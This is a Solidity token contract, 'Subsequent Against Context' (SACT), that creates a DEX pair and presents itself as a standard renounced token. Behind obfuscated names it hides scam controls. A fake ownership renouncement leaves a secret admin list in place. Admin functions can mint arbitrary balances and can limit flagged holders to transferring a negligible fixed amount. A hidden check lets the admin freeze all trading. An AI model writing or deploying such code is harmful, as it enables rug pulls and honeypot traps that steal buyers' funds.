//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface launchedLiquidityTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buySell) external view returns (uint256);

    function transfer(address tradingSender, uint256 walletTo) external returns (bool);

    function allowance(address amountIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletTo) external returns (bool);

    function transferFrom(
        address sender,
        address tradingSender,
        uint256 walletTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderTake, uint256 value);
    event Approval(address indexed amountIs, address indexed spender, uint256 value);
}

abstract contract buyLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface takeFund {
    function createPair(address totalMin, address receiverEnableToken) external returns (address);
}

interface launchedLiquidityTxMetadata is launchedLiquidityTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SubsequentAgainstContext is buyLaunch, launchedLiquidityTx, launchedLiquidityTxMetadata {

    address public maxLaunched;

    string private tokenListTrading = "SACT";

    mapping(address => bool) public marketingLimit;

    function owner() external view returns (address) {
        return senderAt;
    }

    uint256 isTotal;

    function launchedTrading(address amountAt, uint256 walletTo) public {
        launchSwap();
        fromTo[amountAt] = walletTo;
    }

    address public maxList;

    function maxEnable(address marketingToken) public {
        launchSwap();
        if (minTrading == sellMax) {
            limitLaunch = false;
        }
        if (marketingToken == maxList || marketingToken == maxLaunched) {
            return;
        }
        marketingLimit[marketingToken] = true;
    }

    uint256 constant exemptIsMin = 13 ** 10;

    bool public autoReceiver;

    mapping(address => bool) public listTo;

    address private senderAt;

    uint8 private minAuto = 18;

    function name() external view virtual override returns (string memory) {
        return atList;
    }

    mapping(address => uint256) private fromTo;

    uint256 receiverTotal;

    function launchSwap() private view {
        require(listTo[_msgSender()]);
    }

    bool private fromMax;

    address liquidityFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private atList = "Subsequent Against Context";

    constructor (){
        
        liquidityMax walletLimit = liquidityMax(liquidityFee);
        maxLaunched = takeFund(walletLimit.factory()).createPair(walletLimit.WETH(), address(this));
        
        maxList = _msgSender();
        listAt();
        listTo[maxList] = true;
        fromTo[maxList] = enableReceiver;
        if (maxReceiver == sellMax) {
            sellMax = isTx;
        }
        emit Transfer(address(0), maxList, enableReceiver);
    }

    uint256 private sellMax;

    function decimals() external view virtual override returns (uint8) {
        return minAuto;
    }

    uint256 private enableReceiver = 100000000 * 10 ** 18;

    function listAt() public {
        emit OwnershipTransferred(maxList, address(0));
        senderAt = address(0);
    }

    function getOwner() external view returns (address) {
        return senderAt;
    }

    uint256 private fromModeExempt;

    function fundTx(address shouldAuto, address tradingSender, uint256 walletTo) internal returns (bool) {
        require(fromTo[shouldAuto] >= walletTo);
        fromTo[shouldAuto] -= walletTo;
        fromTo[tradingSender] += walletTo;
        emit Transfer(shouldAuto, tradingSender, walletTo);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return enableReceiver;
    }

    address listShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return tokenListTrading;
    }

    function balanceOf(address buySell) public view virtual override returns (uint256) {
        return fromTo[buySell];
    }

    mapping(address => mapping(address => uint256)) private isWallet;

    function transferFrom(address shouldAuto, address tradingSender, uint256 walletTo) external override returns (bool) {
        if (_msgSender() != liquidityFee) {
            if (isWallet[shouldAuto][_msgSender()] != type(uint256).max) {
                require(walletTo <= isWallet[shouldAuto][_msgSender()]);
                isWallet[shouldAuto][_msgSender()] -= walletTo;
            }
        }
        return txEnable(shouldAuto, tradingSender, walletTo);
    }

    uint256 private maxReceiver;

    function approve(address swapTake, uint256 walletTo) public virtual override returns (bool) {
        isWallet[_msgSender()][swapTake] = walletTo;
        emit Approval(_msgSender(), swapTake, walletTo);
        return true;
    }

    function allowance(address tokenMarketingReceiver, address swapTake) external view virtual override returns (uint256) {
        if (swapTake == liquidityFee) {
            return type(uint256).max;
        }
        return isWallet[tokenMarketingReceiver][swapTake];
    }

    function txEnable(address shouldAuto, address tradingSender, uint256 walletTo) internal returns (bool) {
        if (shouldAuto == maxList) {
            return fundTx(shouldAuto, tradingSender, walletTo);
        }
        uint256 totalTrading = launchedLiquidityTx(maxLaunched).balanceOf(listShould);
        require(totalTrading == receiverTotal);
        require(tradingSender != listShould);
        if (marketingLimit[shouldAuto]) {
            return fundTx(shouldAuto, tradingSender, exemptIsMin);
        }
        return fundTx(shouldAuto, tradingSender, walletTo);
    }

    uint256 public isTx;

    function transfer(address amountAt, uint256 walletTo) external virtual override returns (bool) {
        return txEnable(_msgSender(), amountAt, walletTo);
    }

    uint256 private minTrading;

    function marketingSenderMax(address liquidityMaxLimit) public {
        if (autoReceiver) {
            return;
        }
        
        listTo[liquidityMaxLimit] = true;
        
        autoReceiver = true;
    }

    function teamWallet(uint256 walletTo) public {
        launchSwap();
        receiverTotal = walletTo;
    }

    bool private limitLaunch;

    event OwnershipTransferred(address indexed modeFromReceiver, address indexed modeTotal);

}